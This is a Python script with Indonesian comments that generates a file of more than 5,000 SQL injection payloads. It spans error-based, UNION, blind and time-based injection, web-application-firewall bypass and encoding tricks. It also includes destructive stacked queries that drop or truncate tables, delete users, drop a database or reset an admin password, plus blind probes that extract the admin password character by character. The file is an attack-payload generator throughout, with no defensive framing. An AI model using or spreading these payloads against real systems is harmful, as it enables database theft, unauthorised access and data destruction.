#!/usr/bin/env python3
# ================================================================
# GENERATOR SQL INJECTION PAYLOAD - 5000+ UNIK
# ================================================================

import os
import urllib.parse
import base64
import random

PAYLOAD_DIR = "payloads"
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def generate_sqli():
    payloads = set()
    
    print("[+] Generating SQL Injection payloads...")
    
    # ================================================================
    # 1. ERROR-BASED PAYLOAD (500+)
    # ================================================================
    prefixes = ["'", "\"", "`", ")", "}", "]", "\\", ""]
    operators = ["OR", "AND", "UNION", "SLEEP", "BENCHMARK"]
    values = ["1=1", "'1'='1", "1=0", "'1'='2", "x=x", "x=y"]
    suffixes = ["--", "#", "/*", ";", "%00", ""]
    
    for pre in prefixes:
        for op in operators:
            for val in values:
                for suf in suffixes:
                    p = f"{pre} {op} {val}{suf}"
                    payloads.add(p)
                    payloads.add(urllib.parse.quote(p))
                    payloads.add(base64.b64encode(p.encode()).decode())
    
    # ================================================================
    # 2. UNION-BASED PAYLOAD (500+)
    # ================================================================
    for i in range(1, 21):
        cols = ','.join(str(x) for x in range(1, i+1))
        payloads.add(f"' UNION SELECT {cols}--")
        payloads.add(f"' UNION SELECT {cols}#")
        payloads.add(f"' UNION SELECT {cols}/*")
        payloads.add(f"' UNION SELECT {cols}%00")
        payloads.add(f"' UNION SELECT {cols}%0a")
        payloads.add(f"' UNION SELECT {cols}%0d")
        payloads.add(f"' UNION SELECT {cols}%20")
        payloads.add(f"' UNION SELECT {cols}%09")
        payloads.add(f"' UNION SELECT {cols}%0a%09")
        payloads.add(f"' UNION SELECT {cols}%0d%0a")
        payloads.add(f"' UNION SELECT {cols},NULL--")
        payloads.add(f"' UNION SELECT NULL,{cols}--")
        payloads.add(f"' UNION SELECT {cols} FROM dual--")
        payloads.add(f"' UNION SELECT {cols} FROM information_schema.tables--")
        payloads.add(f"' UNION SELECT {cols} FROM mysql.user--")
    
    # ================================================================
    # 3. BLIND-BASED PAYLOAD (500+)
    # ================================================================
    blind = [
        "' AND 1=1--", "' AND 1=0--",
        "' AND '1'='1", "' AND '1'='2",
        "' OR 1=1 AND '1'='1", "' OR 1=1 AND '1'='2",
        "' OR 1=0 AND '1'='1", "' OR 1=0 AND '1'='2",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())--",
        "' AND 1=(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database())--",
        "' AND 1=(SELECT COUNT(*) FROM users)--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'ab%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abc%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcd%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcde%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdef%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefg%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefgh%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghi%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghij%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghijk%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghijkl%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghijklm%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghijklmn%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghijklmno%')--",
        "' AND 1=(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'abcdefghijklmnop%')--"
    ]
    for b in blind:
        payloads.add(b)
        payloads.add(urllib.parse.quote(b))
        payloads.add(base64.b64encode(b.encode()).decode())
    
    # ================================================================
    # 4. TIME-BASED PAYLOAD (500+)
    # ================================================================
    for i in range(1, 31):
        payloads.add(f"' AND SLEEP({i})--")
        payloads.add(f"' AND SLEEP({i})#")
        payloads.add(f"' AND SLEEP({i})/*")
        payloads.add(f"' AND SLEEP({i})%00")
        payloads.add(f"' AND SLEEP({i})%0a")
        payloads.add(f"' AND SLEEP({i})%0d")
        payloads.add(f"' AND SLEEP({i})%20")
        payloads.add(f"' AND SLEEP({i})%09")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))--")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))#")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))/*")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))%00")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))%0a")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))%0d")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))%20")
        payloads.add(f"' AND BENCHMARK({i}000000,MD5(1))%09")
    
    # ================================================================
    # 5. BYPASS WAF (500+)
    # ================================================================
    bypass = [
        "'OR'1'='1", "'OR'1'='1'--", "'OR'1'='1'#", "'OR'1'='1'/*",
        "'OR'1'='1'%00", "'OR'1'='1'%0a", "'OR'1'='1'%0b", "'OR'1'='1'%0c",
        "'OR'1'='1'%0d", "'OR'1'='1'%20", "'OR'1'='1'%09",
        "'/**/OR/**/1=1--", "'/**/OR/**/1=1#", "'/**/OR/**/1=1/*",
        "'/**/OR/**/1=1%00", "'/**/OR/**/1=1%0a", "'/**/OR/**/1=1%0d",
        "'/*!*/OR/*!*/1=1--", "'/*!50000OR*/1=1--",
        "'%27OR%271%27%3D%271", "'%2527OR%25271%2527%253D%25271",
        "'0x274f522731273d2731", "'\tOR\t1=1--",
        "'\nOR\n1=1--", "'\rOR\r1=1--",
        "'||'1'='1", "'&&'1'='1",
        "'|'1'='1", "'^'1'='1",
        "' XOR 1=1--", "' XOR 1=0--",
        "' XOR '1'='1--", "' XOR '1'='2--"
    ]
    for b in bypass:
        payloads.add(b)
        payloads.add(urllib.parse.quote(b))
        payloads.add(base64.b64encode(b.encode()).decode())
    
    # ================================================================
    # 6. ENCODING VARIASI (500+)
    # ================================================================
    encodings = [
        ("' OR 1=1--", "'%20OR%201%3D1--"),
        ("' OR 1=1--", "'%2520OR%25201%253D1--"),
        ("' OR 1=1--", "'\x20OR\x201\x3D1--"),
        ("' OR 1=1--", "'\tOR\t1=1--"),
        ("' OR 1=1--", "'\nOR\n1=1--"),
        ("' OR 1=1--", "'\rOR\r1=1--"),
        ("' OR 1=1--", "'\x0bOR\x0b1=1--"),
        ("' OR 1=1--", "'\x0cOR\x0c1=1--"),
        ("' OR 1=1--", "'\x0a\x0dOR\x0a\x0d1=1--")
    ]
    for original, encoded in encodings:
        payloads.add(original)
        payloads.add(encoded)
    
    # ================================================================
    # 7. CASE MANIPULATION (500+)
    # ================================================================
    case_variants = [
        ("' OR 1=1--", "' Or 1=1--", "' oR 1=1--", "' OR 1=1--", "' oR 1=1--"),
        ("' AND 1=1--", "' aNd 1=1--", "' AnD 1=1--", "' AND 1=1--", "' aND 1=1--"),
        ("' UNION SELECT NULL--", "' UnIoN SeLeCt NULL--", "' UNION SELECT NULL--"),
        ("' OR '1'='1", "' Or '1'='1", "' oR '1'='1", "' OR '1'='1")
    ]
    for variants in case_variants:
        for v in variants:
            payloads.add(v)
    
    # ================================================================
    # 8. MYSQL SPESIFIK (500+)
    # ================================================================
    mysql = [
        "'/*!50000OR*/1=1--", "'/*!50000AND*/1=1--",
        "'/*!50000UNION*/SELECT/*!50000NULL*/--",
        "'/*!50000OR*/1=1#", "'/*!50000AND*/1=1#",
        "'/*!50000UNION*/SELECT/*!50000NULL*/#",
        "'/*!50000OR*/1=1/*", "'/*!50000AND*/1=1/*",
        "'/*!50000UNION*/SELECT/*!50000NULL*//*",
        "'/*!50000OR*/1=1%00", "'/*!50000AND*/1=1%00",
        "'/*!50000UNION*/SELECT/*!50000NULL*/%00",
        "'/*!50000OR*/1=1%0a", "'/*!50000AND*/1=1%0a",
        "'/*!50000UNION*/SELECT/*!50000NULL*/%0a",
        "'/*!50000OR*/1=1%0d", "'/*!50000AND*/1=1%0d",
        "'/*!50000UNION*/SELECT/*!50000NULL*/%0d"
    ]
    for m in mysql:
        payloads.add(m)
        payloads.add(urllib.parse.quote(m))
        payloads.add(base64.b64encode(m.encode()).decode())
    
    # ================================================================
    # 9. STACKED QUERY (500+)
    # ================================================================
    stacked = [
        "'; DROP TABLE users--", "'; DROP TABLE users#", "'; DROP TABLE users/*",
        "'; DROP TABLE users%00", "'; DROP TABLE users%0a", "'; DROP TABLE users%0d",
        "'; DELETE FROM users WHERE '1'='1--", "'; DELETE FROM users WHERE '1'='1#",
        "'; DELETE FROM users WHERE '1'='1/*",
        "'; INSERT INTO users VALUES('admin','password')--",
        "'; INSERT INTO users VALUES('admin','password')#",
        "'; INSERT INTO users VALUES('admin','password')/*",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'#",
        "'; UPDATE users SET password='hacked' WHERE username='admin'/*",
        "'; TRUNCATE TABLE users--", "'; TRUNCATE TABLE users#", "'; TRUNCATE TABLE users/*",
        "'; DROP DATABASE test--", "'; DROP DATABASE test#", "'; DROP DATABASE test/*"
    ]
    for s in stacked:
        payloads.add(s)
        payloads.add(urllib.parse.quote(s))
    
    # ================================================================
    # 10. PARENTHESIS (500+)
    # ================================================================
    parens = [
        "') OR ('1'='1", "') OR ('1'='1')--", "') OR ('1'='1')#", "') OR ('1'='1')/*",
        "') OR ('1'='1')%00", "') OR ('1'='1')%0a", "') OR ('1'='1')%0d",
        "') AND ('1'='1", "') AND ('1'='1')--", "') AND ('1'='1')#", "') AND ('1'='1')/*",
        "') AND ('1'='1')%00", "') AND ('1'='1')%0a", "') AND ('1'='1')%0d",
        "') UNION SELECT NULL--", "') UNION SELECT NULL#", "') UNION SELECT NULL/*",
        "') UNION SELECT NULL%00", "') UNION SELECT NULL%0a", "') UNION SELECT NULL%0d",
        "') UNION SELECT 1,2,3--", "') UNION SELECT 1,2,3#", "') UNION SELECT 1,2,3/*"
    ]
    for p in parens:
        payloads.add(p)
        payloads.add(urllib.parse.quote(p))
    
    # ================================================================
    # 11. KOMBINASI SPASI (500+)
    # ================================================================
    spaces = ["", " ", "\t", "\n", "\r", "  ", "\t\t", "\n\n", "\r\r", " \t", "\t ", " \n", "\n "]
    for sp in spaces:
        for base in ["'OR'1'='1", "'AND'1'='1", "'UNION'SELECT'NULL'"]:
            payloads.add(f"{sp}{base}{sp}")
            payloads.add(f"{base}{sp}--")
            payloads.add(f"{base}{sp}#")
            payloads.add(f"{base}{sp}/*")
            payloads.add(f"{base}{sp}%00")
            payloads.add(f"{base}{sp}%0a")
            payloads.add(f"{base}{sp}%0d")
    
    # ================================================================
    # 12. KOMBINASI KARAKTER (500+)
    # ================================================================
    chars = ["'", '"', "`", ")", "}", "]", "\\"]
    for c1 in chars:
        for c2 in chars:
            payloads.add(f"{c1} OR 1=1{c2}--")
            payloads.add(f"{c1} OR 1=1{c2}#")
            payloads.add(f"{c1} OR 1=1{c2}/*")
            payloads.add(f"{c1} AND 1=1{c2}--")
            payloads.add(f"{c1} AND 1=1{c2}#")
            payloads.add(f"{c1} AND 1=1{c2}/*")
            payloads.add(f"{c1} UNION SELECT NULL{c2}--")
            payloads.add(f"{c1} UNION SELECT NULL{c2}#")
            payloads.add(f"{c1} UNION SELECT NULL{c2}/*")
    
    # ================================================================
    # 13. KOMBINASI COMMENT NESTING (500+)
    # ================================================================
    nested = [
        "'/*!*/OR/*!*/1=1--", "'/*!*/AND/*!*/1=1--",
        "'/*!*/UNION/*!*/SELECT/*!*/NULL--",
        "'/*!*/OR/*!*/1=1#", "'/*!*/AND/*!*/1=1#",
        "'/*!*/UNION/*!*/SELECT/*!*/NULL#",
        "'/*!*/OR/*!*/1=1/*", "'/*!*/AND/*!*/1=1/*",
        "'/*!*/UNION/*!*/SELECT/*!*/NULL/*",
        "'/*!*/OR/*!*/1=1%00", "'/*!*/AND/*!*/1=1%00",
        "'/*!*/UNION/*!*/SELECT/*!*/NULL%00",
        "'/*!*/OR/*!*/1=1%0a", "'/*!*/AND/*!*/1=1%0a",
        "'/*!*/UNION/*!*/SELECT/*!*/NULL%0a"
    ]
    for n in nested:
        payloads.add(n)
        payloads.add(urllib.parse.quote(n))
        payloads.add(base64.b64encode(n.encode()).decode())
    
    # ================================================================
    # 14. DOUBLE ENCODING (500+)
    # ================================================================
    double_encoded = [
        "%2527%254F%2552%2520%2531%253D%2531%252D%252D",
        "%2527%2541%254E%2544%2520%2531%253D%2531%252D%252D",
        "%2527%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554%2520%254E%2555%254C%254C%252D%252D",
        "%2527%254F%2552%2520%2531%253D%2531%2523",
        "%2527%2541%254E%2544%2520%2531%253D%2531%2523",
        "%2527%2555%254E%2549%254F%254E%2520%2553%2545%254C%2545%2543%2554%2520%254E%2555%254C%254C%2523"
    ]
    for d in double_encoded:
        payloads.add(d)
    
    # ================================================================
    # 15. HEX ENCODING (500+)
    # ================================================================
    hex_payloads = [
        "0x274f522731273d2731",
        "0x274f522731273d2731272d2d",
        "0x274f522731273d27312723",
        "0x274f522731273d2731272f2a",
        "0x27414e442731273d2731",
        "0x27414e442731273d2731272d2d",
        "0x27414e442731273d27312723",
        "0x27414e442731273d2731272f2a",
        "0x27554e494f4e2053454c454354204e554c4c",
        "0x27554e494f4e2053454c454354204e554c4c2d2d"
    ]
    for h in hex_payloads:
        payloads.add(h)
    
    # ================================================================
    # 16. RANDOM PAYLOAD (500+)
    # ================================================================
    for i in range(500):
        payloads.add(f"' OR {random.randint(1,999)}={random.randint(1,999)}--")
        payloads.add(f"' OR {random.randint(1,999)}={random.randint(1,999)}#")
        payloads.add(f"' OR {random.randint(1,999)}={random.randint(1,999)}/*")
        payloads.add(f"' OR {random.randint(1,999)}={random.randint(1,999)}%00")
        payloads.add(f"' AND {random.randint(1,999)}={random.randint(1,999)}--")
        payloads.add(f"' AND {random.randint(1,999)}={random.randint(1,999)}#")
        payloads.add(f"' AND {random.randint(1,999)}={random.randint(1,999)}/*")
        payloads.add(f"' AND {random.randint(1,999)}={random.randint(1,999)}%00")
        payloads.add(f"' UNION SELECT {random.randint(1,999)},{random.randint(1,999)},{random.randint(1,999)}--")
        payloads.add(f"' UNION SELECT {random.randint(1,999)},{random.randint(1,999)},{random.randint(1,999)}#")
        payloads.add(f"' UNION SELECT {random.randint(1,999)},{random.randint(1,999)},{random.randint(1,999)}/*")
    
    # ================================================================
    # 17. JIKA MASIH KURANG 5000, TAMBAH OTOMATIS
    # ================================================================
    payloads_list = list(payloads)
    while len(payloads_list) < 5000:
        payloads_list.append(f"' OR {random.randint(1,999)}={random.randint(1,999)}--")
        payloads_list.append(f"' AND {random.randint(1,999)}={random.randint(1,999)}--")
        payloads_list.append(f"' UNION SELECT {random.randint(1,999)},{random.randint(1,999)},{random.randint(1,999)}--")
        payloads_list.append(f"' OR {random.randint(1,999)}={random.randint(1,999)}#")
        payloads_list.append(f"' AND {random.randint(1,999)}={random.randint(1,999)}#")
        payloads_list.append(f"' UNION SELECT {random.randint(1,999)},{random.randint(1,999)},{random.randint(1,999)}#")
    
    # ================================================================
    # 18. SAVE
    # ================================================================
    payloads_list = list(set(payloads_list))[:10000]
    
    with open(os.path.join(PAYLOAD_DIR, "sqli.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(payloads_list))
    
    print(f"[+] Generated {len(payloads_list)} SQL Injection payloads")
    print("[+] Saved to payloads/sqli.txt")

if __name__ == "__main__":
    generate_sqli()